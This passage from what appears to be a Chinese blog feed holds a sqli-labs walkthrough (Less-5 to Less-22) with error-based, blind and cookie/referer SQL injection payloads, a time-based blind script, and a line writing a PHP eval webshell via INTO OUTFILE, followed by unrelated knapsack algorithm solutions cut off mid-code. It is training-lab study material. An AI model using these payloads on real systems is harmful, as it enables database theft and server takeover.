class="params">()</span></span>~~~取整</span><br></pre></td></tr></table></figure><p>将在<code>information_schema.schemata</code>这个数据库表的schema_name字段(数据库名)查出，然后把该字段的值拿去<code>information_schema.tables</code><br>,然后利用<b><code>count()、rand()、group by</code>共用产生报错</b>，来报错获取数据库名。<br><code>limit n,1</code>更改n，来获取之后的表(有概率失败，多试几次)。<br>可以使用and连接，记得加括号，不过我这边用的是union</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> user</span><br><span class="line"> where id= <span class="string">'-1'</span>union select 1,2,3 <span class="keyword">from</span> (select count(*),concat((select concat(schema_name) </span><br><span class="line">  <span class="keyword">from</span> information_schema.schemata limit 0,1),floor(rand()<span class="number">*2</span>)) as x</span><br><span class="line">   <span class="keyword">from</span> information_schema.tables<span class="built_in"> group </span>by x)as a -- +</span><br></pre></td></tr></table></figure><p><img src="/7.jpg"></p><h3 id="数据表"><a href="#数据表" class="headerlink" title="数据表"></a>数据表</h3><p>将<code>information_schema.tables</code>里面查出来的TABLE_NAME(数据表名)，拿去查<code>information_schema.columns</code>中的字段名,通过<b><code>count()、rand()、group by</code>共用产生报错</b>，来获取数据表名</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> user</span><br><span class="line"> where id= <span class="string">'-1'</span>union select 1,2,3 <span class="keyword">from</span> (select count(*),concat((select concat(table_name) </span><br><span class="line"> <span class="keyword">from</span> information_schema.tables limit 0,1),floor(rand()<span class="number">*2</span>)) as x</span><br><span class="line">  <span class="keyword">from</span> information_schema.columns<span class="built_in"> group </span>by x)as a -- +</span><br></pre></td></tr></table></figure><p><img src="/8.jpg"></p><h3 id="字段名"><a href="#字段名" class="headerlink" title="字段名"></a>字段名</h3><p>将<code>information_schema.COLUMNS</code>里面查出来的<b>flag</b>数据表的column_name(字段名)，拿去查<code>information_schema.columns</code>,利用<b><code>count()、rand()、group by</code>共用产生报错</b>，获取字段名。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span></span><br><span class="line"> <span class="keyword">where</span> id= <span class="string">'-1'</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> (<span class="keyword">select</span> count(*),concat((<span class="keyword">select</span> concat(<span class="built_in">column_name</span>)</span><br><span class="line">  <span class="keyword">from</span> information_schema.<span class="keyword">COLUMNS</span> <span class="keyword">WHERE</span> <span class="built_in">table_name</span>=<span class="string">'flag'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),floor(rand(<span class="number">0</span>)*<span class="number">2</span>)) <span class="keyword">as</span> x</span><br><span class="line">   <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">group</span> <span class="keyword">by</span> x)<span class="keyword">as</span> a <span class="comment">-- +</span></span><br></pre></td></tr></table></figure><p><img src="/9.jpg"></p><h3 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h3><p>将<code>ctftraining.flag</code>里面查出来的flag,拿到<code>information_schema.tables</code>,利用<b><code>count()、rand()、group by</code>共用产生报错</b>，获取数据。虽然flag数据表中只有一条数据，实际上它查询的时候是看<code>information_schema.tables</code>中是否两条以上。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> user</span><br><span class="line"> where id= <span class="string">'-1'</span>union select 1,2,3 <span class="keyword">from</span> (select count(*),concat((select concat(flag) </span><br><span class="line"> <span class="keyword">from</span> ctftraining.flag limit 0,1),floor(rand(0)<span class="number">*2</span>)) as x </span><br><span class="line"> <span class="keyword">from</span> information_schema.tables<span class="built_in"> group </span>by x)as a -- +</span><br></pre></td></tr></table></figure><p><img src="/10.jpg" alt="我flag里面只有一条数据，但是依旧能查出来，所以看的是后面的数据表"></p><h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><p>单引号没显示，双引号显示了报错。题目给的也是双引号(据题原理看上题，讲的很详细了。如果没懂可以通过联系方式联系我)，利用上题payload:<br></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span></span><br><span class="line"> <span class="keyword">where</span> id= "-1" <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> (<span class="keyword">select</span> count(*),concat((<span class="keyword">select</span> concat(<span class="built_in">column_name</span>)</span><br><span class="line">  <span class="keyword">from</span> information_schema.<span class="keyword">COLUMNS</span> <span class="keyword">WHERE</span> <span class="built_in">table_name</span>=<span class="string">'flag'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),floor(rand(<span class="number">0</span>)*<span class="number">2</span>)) <span class="keyword">as</span> x</span><br><span class="line">   <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">group</span> <span class="keyword">by</span> x)<span class="keyword">as</span> a <span class="comment">-- +</span></span><br></pre></td></tr></table></figure><h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><p>7是让我们写入文件，我也看到有别的办法。不过我看网上利用注册表来拿到绝对路径信息。我感觉太麻烦了&#x3D; &#x3D;。记录一下payload。以后遇到了再写。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>'))UNION SELECT <span class="number">1</span>,<span class="number">2</span>,'&lt;?php @eval($_post[<span class="string">"mima"</span>])?&gt;' into outfile <span class="string">"绝对路径\sqllib<span class="subst">\\</span>Less-7<span class="subst">\\</span>yijuhua.php"</span>--+</span><br></pre></td></tr></table></figure><h2 id="less-8-布尔盲注"><a href="#less-8-布尔盲注" class="headerlink" title="less-8(布尔盲注)"></a>less-8(布尔盲注)</h2><p>这关报错被注释了，看有些人用的时间盲注，这边准备学习布尔盲注。两个盲注意思我都懂，但是不知道怎么实现&#x3D; &#x3D;。没事慢慢来~~~<br><img src="/11.png" alt="借别人的图= ="></p><p>具体讲解可以看下面两篇文章，因为之前就了解过这个东西，所以也比较容易理解。</p><p><a href="https://www.cnblogs.com/hai-long/p/11847663.html" target="_blank" rel="noopener">布尔盲注</a><br><a href="https://www.cnblogs.com/lcamry/p/5763129.html" target="_blank" rel="noopener">MYSQL注入天书之盲注讲解</a></p><p>盲注是要写脚本得，建议自己写一下。我写了个代码，可以边学边参考。语句的话可以在本地搞搞自己的mysql。有些命令，命令行可以弄到，但是Navicat不行。总而言之就是多试试&#x3D; &#x3D;。别偷懒~~</p><p><img src="/11.jpg" alt="盲注的脚本"></p><a class="btn" href="https://github.com/ChenZIDu/SQL-/archive/master.zip" target="_blank" rel="noopener"><i class="fa fa-download fa-lg fa-fw"></i>点击下载代码</a><h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><p>这题是时间盲注，思路的话，大概就是查ascii码，利用if语句和sleep()函数,正确的话直接返回，睡五秒钟再返回，就相当于if,else，成立的话在你设定的时间之后返回，否则睡眠sleep(n),n秒钟再返回</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> user </span>where <span class="attribute">id</span>=<span class="string">'1'</span> <span class="keyword">and</span> <span class="keyword">If</span>(ascii(substr(database(),2,1))=102,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p><img src="/12.jpg" alt="时间注入原理"></p><p>然后写脚本的时候当我们每次尝试注入的时候，先获取当前的time，然后get(post)请求之后，查看返回的时间是否大于你设定的时间。<br>截一小段代码意思一下好了。思路反正和布尔盲注是一样的。都是盲注。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">"http://2a18140a-af6e-46c4-b272-140b0d0fd6b5.node3.buuoj.cn/Less-8/?id=1"</span></span><br><span class="line">  target=<span class="string">"'and if(ascii(substr(database(),2,1))=101,sleep(1.5),0)--+"</span></span><br><span class="line">  <span class="built_in">num</span>=<span class="number">1.5</span></span><br><span class="line">  start_time = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line">  r = requests.<span class="built_in">get</span>(url)</span><br><span class="line">  end_time = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line">  <span class="keyword">if</span> end_time-start_time&gt;=<span class="number">1.5</span>:</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">"成立"</span>)</span><br><span class="line">      <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">"不成立"</span>)</span><br></pre></td></tr></table></figure><h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2><p>这题就是上面那题变成了双引号注入</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> user </span>where <span class="attribute">id</span>=<span class="string">"1"</span> <span class="keyword">and</span> <span class="keyword">If</span>(ascii(substr(database(),2,1))=102,1,sleep(5)) -- +</span><br></pre></td></tr></table></figure><h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h2><p>这题和<b>less-1</b>一样，但是他是两列，我一开始以为是三列，然后order by了一下，发现是两列，估计是username和password。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> user </span>where <span class="attribute">username</span>=<span class="string">"-1"</span> UNION select version(),database() -- + <span class="keyword">and</span> password=(<span class="string">"123456"</span>);</span><br></pre></td></tr></table></figure><h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h2><p>这题就变成了双引号，加括号。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> user </span>where username=(<span class="string">"-1"</span>) UNION select version(),database() -- + <span class="keyword">and</span> password=(<span class="string">"123456"</span>);</span><br></pre></td></tr></table></figure><h2 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h2><p>这题就是单引号，加括号。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> user </span>where username=(<span class="string">'-1'</span>) UNION select version(),database() -- + <span class="keyword">and</span> password=(<span class="string">"123456"</span>);</span><br></pre></td></tr></table></figure><h2 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h2><p>这题就是纯单引号。测试的时候可以多测试几遍，或者看他报错信息。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> user </span>where <span class="attribute">username</span>=<span class="string">"1"</span> UNION select version(),database() -- + <span class="keyword">and</span> password=(<span class="string">"123456"</span>);</span><br></pre></td></tr></table></figure><h2 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h2><p>这题就是单引号闭合，但是关闭了报错和无回显，可以用时间盲注或者布尔盲注。<br>类型的话和<b>less-14</b>一样</p><h2 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h2><p>这题就是双引号加括号闭合，关闭了回显和报错，可以用时间盲注或者布尔盲注。</p><h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p>这题可以是更改密码，但是前提是要知道账号，看源码可以发现题目中对username进行了验证，所以只能再password来进行注入。<br>我这边用的是and,再加count(*)、rand(0)、group by的报错查询注入。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>((<span class="keyword">select</span> <span class="keyword">concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)) <span class="keyword">as</span> x <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> x)<span class="keyword">as</span> a) <span class="comment">-- +</span></span><br></pre></td></tr></table></figure><p><img src="/13.jpg" alt="less-17"></p><h3 id="另一种做法"><a href="#另一种做法" class="headerlink" title="另一种做法"></a>另一种做法</h3><p>利用updatexml来进行报错信息注入<br><br>数据库名：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">uname</span>=admin&amp;passwd=<span class="string">' or updatexml(1,concat('</span><span class="comment">#',(database())),0)--+</span></span><br></pre></td></tr></table></figure><p>表名：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>=admin&amp;passwd=' <span class="keyword">or</span> updatexml(1,concat(<span class="string">'#'</span>,(select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=<span class="string">'security'</span>)),0)--+</span><br></pre></td></tr></table></figure><p>接下来模仿操作就行。</p><h2 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h2><p>也利用上面的updatexml来进行报错注入<br><br><img src="/14.jpg" alt="less-18"></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database())),<span class="number">0</span>))-- +</span><br></pre></td></tr></table></figure><p>注释之前多一个)闭合千万别忘了，可以看看源码<br><img src="/15.jpg" alt="less-18"></p><h2 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h2><p>可以看到登陆成功后显示Referer,判断注入点在这。<br>我们看一下源码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$row1</span>)&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 3 &gt;'</span>;</span><br><span class="line"><span class="variable">$insert</span>=<span class="string">"INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('<span class="variable">$uagent</span>', '<span class="variable">$IP</span>')"</span>;</span><br><span class="line">mysql_query(<span class="variable">$insert</span>);</span><br><span class="line">//<span class="built_in">echo</span> <span class="string">'Your IP ADDRESS is: '</span> .<span class="variable">$IP</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'Your Referer is: '</span> .<span class="variable">$uagent</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;img src="../images/flag.jpg" /&gt;'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/16.jpg" alt="less-19"></p><h2 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h2><p>看下源码，发现应该是存在cookie注入的，登陆成功后会显示你的个人信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE username='<span class="variable">$cookee</span>' LIMIT 0,1"</span>;</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$result</span>)&#123;</span><br><span class="line">  die(<span class="string">'Issue with your mysql: '</span> . mysql_error());</span><br><span class="line">  &#125;</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)&#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">'&lt;font color= "pink" font size="5"&gt;'</span>;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">'Your Login name:'</span>. <span class="variable">$row</span>[<span class="string">'username'</span>];</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;font color= "grey" font size="5"&gt;'</span>;  </span><br><span class="line"><span class="built_in">echo</span> <span class="string">'Your Password:'</span> .<span class="variable">$row</span>[<span class="string">'password'</span>];</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"&lt;/font&gt;&lt;/b&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'Your ID:'</span> .<span class="variable">$row</span>[<span class="string">'id'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码后半段发现会把cookie里面的内容衔接进去查询，所以我们可以在cookie里面构造注入<br>读取数据库名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie:' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(schema_name)<span class="keyword">from</span> information_schema.schemata <span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h2><p><img src="/18.jpg" alt="less-21"><br>分析源码会发现有一步解码操作,也就是说我们要将cookie里面的内容先转成base64,注意下面的sql语句存在括号，所以要<code>)</code>闭合(千万别忘了)。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$coo</span>kee = base64_decode(<span class="symbol">$coo</span>kee);</span><br></pre></td></tr></table></figure><h2 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h2><p><img src="/19.jpg" alt="less-22"><br>看源码，多了一步双引号包裹，懂我意思吧！</p><hr><p>拖了半个月了终于解决了一个Page。。。。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/Leep0rt/article/details/78556440" target="_blank" rel="noopener">双查询注入</a><br><a href="https://www.2cto.com/article/201604/498394.html" target="_blank" rel="noopener">Mysql报错注入原理分析(count()、rand()、group by)</a><br><a href="https://blog.csdn.net/qq_41725312/article/details/83040325" target="_blank" rel="noopener">MySQL updatexml报错注入</a><br><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">Sqli-labs源码</a></p>]]></content>
      
      
      <categories>
          
          <category> sql基本注入 </category>
          
          <category> 布尔盲注 </category>
          
          <category> 时间盲注 </category>
          
          <category> count()、rand()、group by连用报错注入原理分析 </category>
          
          <category> updatexml报错注入 </category>
          
          <category> Referer注入 </category>
          
          <category> Cookie注入 </category>
          
          <category> User-Agent注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> MariaDB </tag>
            
            <tag> Hearders </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HDU-寒冰王座(多重背包)</title>
      <link href="/2020/04/06/HDU-%E5%AF%92%E5%86%B0%E7%8E%8B%E5%BA%A7-%E5%A4%9A%E9%87%8D%E8%83%8C%E5%8C%85/"/>
      <url>/2020/04/06/HDU-%E5%AF%92%E5%86%B0%E7%8E%8B%E5%BA%A7-%E5%A4%9A%E9%87%8D%E8%83%8C%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p id="div-border-left-green">不死族的巫妖王发工资拉,死亡骑士拿到一张N元的钞票(记住,只有一张钞票),为了防止自己在战斗中频繁的死掉,他决定给自己买一些道具,于是他来到了地精商店前.死亡骑士:"我要买道具!"地精商人:"我们这里有三种道具,血瓶150块一个,魔法药200块一个,无敌药水350块一个."死亡骑士:"好的,给我一个血瓶."说完他掏出那张N元的大钞递给地精商人.地精商人:"我忘了提醒你了,我们这里没有找客人钱的习惯的,多的钱我们都当小费收了的,嘿嘿."死亡骑士:"......"死亡骑士想,与其把钱当小费送个他还不如自己多买一点道具,反正以后都要买的,早点买了放在家里也好,但是要尽量少让他赚小费.现在死亡骑士希望你能帮他计算一下,最少他要给地精商人多少小费.</p><a id="more"></a><h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><p>输入数据的第一行是一个整数T(1&lt;&#x3D;T&lt;&#x3D;100),代表测试数据的数量.然后是T行测试数据,每个测试数据只包含一个正整数N(1&lt;&#x3D;N&lt;&#x3D;10000),N代表死亡骑士手中钞票的面值. 注意:地精商店只有题中描述的三种道具.</p><h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><p>对于每组测试数据,请你输出死亡骑士最少要浪费多少钱给地精商人作为小费.</p><h2 id="输入样例"><a href="#输入样例" class="headerlink" title="输入样例"></a>输入样例</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">900</span></span><br><span class="line"><span class="number">250</span></span><br></pre></td></tr></table></figure><h2 id="输出样例"><a href="#输出样例" class="headerlink" title="输出样例"></a>输出样例</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">50</span></span><br></pre></td></tr></table></figure><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><blockquote class="blockquote-center"><p>完全背包是在N种物品中选取若干件（同一种物品可多次选取）放在空间为V的背包里，每种物品的体积为C1，C2，…，Cn，与之相对应的价值为W1,W2，…，Wn.求解怎么装物品可使背包里物品总价值最大。</p></blockquote><p>通过转化把多重背包转化为01背包。状态表达式<code>dp[j]=max(dp[j],dp[j-f[i]]+f[i]);</code></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,k,mixn;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">11000</span>]; </span><br><span class="line"><span class="keyword">int</span> f[<span class="number">4</span>]=&#123;<span class="number">150</span>,<span class="number">200</span>,<span class="number">350</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> t; </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;t);</span><br><span class="line">    <span class="keyword">while</span>(t--)&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=f[i];j&lt;=n;j++)&#123;</span><br><span class="line">dp[j]=<span class="built_in">max</span>(dp[j],dp[j-f[i]]+f[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,n-dp[n]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
          <category> 日常训练 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bone Collector(01背包)</title>
      <link href="/2020/04/02/Bone-Collector/"/>
      <url>/2020/04/02/Bone-Collector/</url>
      
        <content type="html"><![CDATA[<p>之前背包问题学了忘学了忘&#x3D; &#x3D;是太笨了。</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>许多年前，在泰迪的家乡，有一个人被称为“骨收集者”。这个人喜欢收集各种骨头，例如狗，牛的骨头，他也去了坟墓……<br>骨头收集者有一个大袋子，里面装有V，而且在收集骨头的过程中，很明显，不同的骨骼具有不同的值和不同的体积，现在给定沿途的每个骨骼的值，您能否计算出骨骼收集器可以获得的总值的最大值？</p><a id="more"></a><p><img src="/1.jpg" alt="HDU"></p><h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>第一行包含整数T，即案例数。紧随其后的是T个案例，每个案例三行，第一行包含两个整数N，V（N &lt;&#x3D; 1000，V &lt;&#x3D; 1000），它们表示骨头的数量和包的体积。第二行包含代表每个骨骼值的N个整数。第三行包含N个整数，代表每个骨骼的体积。</p><h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>每行一个整数，代表合计的最大值（该数字将小于2 [sup] 31 [&#x2F; sup]）。</p><h2 id="输入样例"><a href="#输入样例" class="headerlink" title="输入样例"></a>输入样例</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span></span><br><span class="line"><span class="symbol">5 </span><span class="number">10</span> </span><br><span class="line"><span class="symbol">1 </span><span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> </span><br><span class="line"><span class="symbol">5 </span><span class="number">4</span> <span class="number">3</span> <span class="number">2</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="输出样例"><a href="#输出样例" class="headerlink" title="输出样例"></a>输出样例</h2><p>14</p><h2 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h2><p id="div-border-left-red">问题分解：当前最优解，要么包含第i种物品，要么不包含第i种物品。<br>DP[i][j]表示前i个物品,背包容量为j的最优值。<br>状态转移方程为：DP[i][j] = max(DP[i-1][j], DP[i-1][j-v[i]] + w[i]);</p><p><img src="/2.jpg" alt="二维数组的动态图"></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,t;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">1100</span>][<span class="number">1100</span>],w[<span class="number">1100</span>],v[<span class="number">1100</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;t);</span><br><span class="line"><span class="keyword">while</span>(t--)&#123;</span><br><span class="line"><span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));</span><br><span class="line"><span 